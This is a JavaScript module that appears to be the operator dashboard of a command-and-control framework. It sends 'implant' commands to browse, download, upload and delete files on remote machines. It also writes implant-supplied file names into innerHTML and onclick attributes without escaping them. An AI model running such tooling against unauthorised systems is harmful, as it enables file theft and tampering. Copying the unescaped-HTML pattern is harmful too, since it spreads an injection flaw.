// File Manager Module
const FileManager = {
    socket: null,
    selectedImplant: null,
    currentPath: '/',
    fileList: [],

    init(socket) {
        this.socket = socket;
        console.log('FileManager initialized with socket');
        this.setupEventListeners();
    },

    setupEventListeners() {
        // Navigation buttons
        const navigateUpBtn = document.getElementById('navigate-up');
        const refreshFilesBtn = document.getElementById('refresh-files');
        const navigatePathBtn = document.getElementById('navigate-path');
        const pathInput = document.getElementById('path-input');

        if (navigateUpBtn) {
            navigateUpBtn.addEventListener('click', () => this.navigateUp());
        }
        
        if (refreshFilesBtn) {
            refreshFilesBtn.addEventListener('click', () => this.refreshFiles());
        }
        
        if (navigatePathBtn) {
            navigatePathBtn.addEventListener('click', () => this.navigateToPath());
        }

        // Path input
        if (pathInput) {
            pathInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    this.navigateToPath();
                }
            });
        }

        // Use custom event for WebSocket messages instead of socket.on
        document.addEventListener('socket-message', (event) => {
            const message = event.detail;
            if (message.type === 'file_list') {
                this.handleFileList(message);
            } else if (message.type === 'file_download') {
                this.handleFileDownload(message);
            } else if (message.type === 'file_upload_complete') {
                this.handleFileUploadComplete(message);
            }
        });
    },

    selectImplant(implantId) {
        console.log(`FileManager: Setting selected implant to ${implantId}`);
        this.selectedImplant = implantId;
        this.currentPath = '/';
        return implantId;
    },

    navigateUp() {
        if (this.currentPath === '/') return;
        
        const pathParts = this.currentPath.split('/').filter(Boolean);
        pathParts.pop();
        this.currentPath = pathParts.length ? '/' + pathParts.join('/') : '/';
        
        this.refreshFiles();
    },

    navigateToPath() {
        const pathInput = document.getElementById('path-input');
        if (!pathInput) {
            console.error('Path input element not found');
            return;
        }
        
        const newPath = pathInput.value.trim();
        
        if (!newPath) {
            dashboard.showNotification('Please enter a valid path', 'warning');
            return;
        }

        this.currentPath = newPath.startsWith('/') ? newPath : '/' + newPath;
        this.refreshFiles();
    },

    refreshFiles() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }

        const pathInput = document.getElementById('path-input');
        if (pathInput) {
            pathInput.value = this.currentPath;
        }
        
        // Send request via WebSocketManager instead of direct socket emit
        if (WebSocketManager && WebSocketManager.send) {
            WebSocketManager.send({
                type: 'get_files',
                implant_id: this.selectedImplant,
                path: this.currentPath
            });
            console.log(`Requested files for path: ${this.currentPath}`);
        } else {
            console.error('WebSocketManager not available');
        }
    },

    handleFileList(data) {
        this.fileList = data.files;
        const fileList = document.getElementById('file-list');
        if (!fileList) {
            console.error('File list element not found');
            return;
        }
        
        fileList.innerHTML = '';

        // Add parent directory entry if not at root
        if (this.currentPath !== '/') {
            const parentRow = document.createElement('tr');
            parentRow.innerHTML = `
                <td>
                    <i class="fas fa-level-up-alt"></i>
                    ..
                </td>
                <td>-</td>
                <td>-</td>
                <td>
                    <button class="btn btn-sm btn-primary" onclick="FileManager.navigateUp()">
                        <i class="fas fa-level-up-alt"></i> Up
                    </button>
                </td>
            `;
            fileList.appendChild(parentRow);
        }

        // Add files and directories
        this.fileList.forEach(file => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>
                    <i class="fas ${file.type === 'directory' ? 'fa-folder' : 'fa-file'}"></i>
                    ${file.name}
                </td>
                <td>${file.type === 'directory' ? '-' : dashboard.formatBytes(file.size)}</td>
                <td>${dashboard.formatDate(file.modified)}</td>
                <td>
                    ${this.getFileActions(file)}
                </td>
            `;
            fileList.appendChild(row);
        });
    },

    getFileActions(file) {
        if (file.type === 'directory') {
            return `
                <button class="btn btn-sm btn-primary" onclick="FileManager.navigateToDirectory('${file.path}')">
                    <i class="fas fa-folder-open"></i> Open
                </button>
            `;
        }

        return `
            <div class="btn-group">
                <button class="btn btn-sm btn-primary" onclick="FileManager.downloadFile('${file.path}')">
                    <i class="fas fa-download"></i> Download
                </button>
                <button class="btn btn-sm btn-danger" onclick="FileManager.deleteFile('${file.path}')">
                    <i class="fas fa-trash"></i> Delete
                </button>
            </div>
        `;
    },

    navigateToDirectory(path) {
        this.currentPath = path;
        this.refreshFiles();
    },

    downloadFile(path) {
        if (!this.selectedImplant) return;

        // Use WebSocketManager instead of socket.emit
        WebSocketManager.send({
            type: 'download_file',
            implant_id: this.selectedImplant,
            path: path
        });
    },

    handleFileDownload(data) {
        const blob = new Blob([data.content], { type: 'application/octet-stream' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = data.filename;
        a.click();
        window.URL.revokeObjectURL(url);
        
        dashboard.showNotification('File downloaded successfully', 'success');
    },

    uploadFile(file) {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }

        const reader = new FileReader();
        reader.onload = (e) => {
            // Use WebSocketManager instead of socket.emit
            WebSocketManager.send({
                type: 'upload_file',
                implant_id: this.selectedImplant,
                path: this.currentPath + '/' + file.name,
                content: e.target.result
            });
        };
        reader.readAsArrayBuffer(file);
    },

    handleFileUploadComplete(data) {
        dashboard.showNotification('File uploaded successfully', 'success');
        this.refreshFiles();
    },

    deleteFile(path) {
        if (!this.selectedImplant) return;

        if (confirm('Are you sure you want to delete this file?')) {
            // Use WebSocketManager instead of socket.emit
            WebSocketManager.send({
                type: 'delete_file',
                implant_id: this.selectedImplant,
                path: path
            });
        }
    }
};

// Remove the duplicate initialization since WebSocketManager now handles this
// Initialize when document is ready
document.addEventListener('DOMContentLoaded', () => {
    // WebSocketManager will initialize this module
    console.log('FileManager waiting for WebSocketManager initialization');
}); 